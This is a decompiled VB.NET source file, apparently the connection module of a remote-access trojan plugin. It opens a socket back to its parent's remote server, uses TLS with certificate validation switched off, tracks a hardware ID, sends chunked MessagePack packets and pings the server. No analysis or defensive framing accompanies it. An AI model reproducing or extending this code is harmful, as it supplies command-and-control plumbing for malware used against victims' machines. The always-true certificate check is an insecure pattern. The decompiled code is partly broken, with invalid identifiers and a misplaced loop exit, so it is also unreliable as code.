Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Net.Security
Imports System.Net.Sockets
Imports System.Security.Authentication
Imports System.Security.Cryptography.X509Certificates
Imports System.Threading
Imports Plugin.MessagePack

Namespace Plugin
	' Token: 0x02000002 RID: 2
	Public Module Connection
		' Token: 0x17000001 RID: 1
		' (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		' (set) Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		Public Property TcpClient As Socket

		' Token: 0x17000002 RID: 2
		' (get) Token: 0x06000003 RID: 3 RVA: 0x0000205F File Offset: 0x0000025F
		' (set) Token: 0x06000004 RID: 4 RVA: 0x00002066 File Offset: 0x00000266
		Public Property SslClient As SslStream

		' Token: 0x17000003 RID: 3
		' (get) Token: 0x06000005 RID: 5 RVA: 0x0000206E File Offset: 0x0000026E
		' (set) Token: 0x06000006 RID: 6 RVA: 0x00002075 File Offset: 0x00000275
		Public Property ServerCertificate As X509Certificate2

		' Token: 0x17000004 RID: 4
		' (get) Token: 0x06000007 RID: 7 RVA: 0x0000207D File Offset: 0x0000027D
		' (set) Token: 0x06000008 RID: 8 RVA: 0x00002084 File Offset: 0x00000284
		Public Property IsConnected As Boolean

		' Token: 0x17000005 RID: 5
		' (get) Token: 0x06000009 RID: 9 RVA: 0x0000208C File Offset: 0x0000028C
		Private ReadOnly Property SendSync As Object = New Object()

		' Token: 0x17000006 RID: 6
		' (get) Token: 0x0600000A RID: 10 RVA: 0x00002093 File Offset: 0x00000293
		' (set) Token: 0x0600000B RID: 11 RVA: 0x0000209A File Offset: 0x0000029A
		Public Property Hwid As String

		' Token: 0x0600000C RID: 12 RVA: 0x000020A4 File Offset: 0x000002A4
		Public Sub InitializeClient(packet As Byte())
			Try
				Connection.TcpClient = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) With { .ReceiveBufferSize = 51200, .SendBufferSize = 51200 }
				Connection.TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0), Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(New Char() { ":"c })(1)))
				Dim connected As Boolean = Connection.TcpClient.Connected
				If connected Then
					Debug.WriteLine("Plugin Connected!")
					Connection.IsConnected = True
					Connection.SslClient = New SslStream(New NetworkStream(Connection.TcpClient, True), False, AddressOf Connection.ValidateServerCertificate)
					Connection.SslClient.AuthenticateAsClient(Connection.TcpClient.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0), Nothing, SslProtocols.Tls, False)
					Dim <>9__23_ As ThreadStart = Connection.<>c.<>9__23_0
					Dim start As ThreadStart = <>9__23_
					If <>9__23_ Is Nothing Then
						Dim threadStart As ThreadStart = Sub()
							Packet.Read()
						End Sub
						start = threadStart
						Connection.<>c.<>9__23_0 = threadStart
					End If
					New Thread(start).Start()
				Else
					Connection.IsConnected = False
				End If
			Catch
				Debug.WriteLine("Disconnected!")
				Connection.IsConnected = False
			End Try
		End Sub

		' Token: 0x0600000D RID: 13 RVA: 0x00002214 File Offset: 0x00000414
		Private Function ValidateServerCertificate(sender As Object, certificate As X509Certificate, chain As X509Chain, sslPolicyErrors As SslPolicyErrors) As Boolean
			Return True
		End Function

		' Token: 0x0600000E RID: 14 RVA: 0x00002228 File Offset: 0x00000428
		Public Sub Disconnected()
			Try
				Connection.IsConnected = False
				Dim sslClient As SslStream = Connection.SslClient
				If sslClient IsNot Nothing Then
					sslClient.Dispose()
				End If
				Dim tcpClient As Socket = Connection.TcpClient
				If tcpClient IsNot Nothing Then
					tcpClient.Dispose()
				End If
				GC.Collect()
			Catch
			End Try
		End Sub

		' Token: 0x0600000F RID: 15 RVA: 0x00002280 File Offset: 0x00000480
		Public Sub Send(msg As Byte())
			Dim sendSync As Object = Connection.SendSync
			SyncLock sendSync
				Try
					Dim flag2 As Boolean = Not Connection.IsConnected OrElse msg Is Nothing
					If Not flag2 Then
						Dim buffersize As Byte() = BitConverter.GetBytes(msg.Length)
						Connection.TcpClient.Poll(-1, SelectMode.SelectWrite)
						Connection.SslClient.Write(buffersize, 0, buffersize.Length)
						Dim flag3 As Boolean = msg.Length > 1000000
						If flag3 Then
							Debug.WriteLine("send chunks")
							Using memoryStream As MemoryStream = New MemoryStream(msg)
								memoryStream.Position = 0L
								Dim chunk As Byte() = New Byte(49999) {}
								While True
									Dim num As Integer = memoryStream.Read(chunk, 0, chunk.Length)
									Dim read As Integer = num
									If num <= 0 Then
										Exit For
									End If
									Connection.TcpClient.Poll(-1, SelectMode.SelectWrite)
									Connection.SslClient.Write(chunk, 0, read)
								End While
							End Using
						Else
							Connection.SslClient.Write(msg, 0, msg.Length)
							Connection.SslClient.Flush()
						End If
						Debug.WriteLine("Plugin Packet Sent")
					End If
				Catch
					Connection.IsConnected = False
				End Try
			End SyncLock
		End Sub

		' Token: 0x06000010 RID: 16 RVA: 0x000023FC File Offset: 0x000005FC
		Public Sub CheckServer(obj As Object)
			Dim msgpack As MsgPack = New MsgPack()
			msgpack.ForcePathObject("Packet").AsString = "Ping!)"
			Connection.Send(msgpack.Encode2Bytes())
			GC.Collect()
		End Sub
	End Module
End Namespace
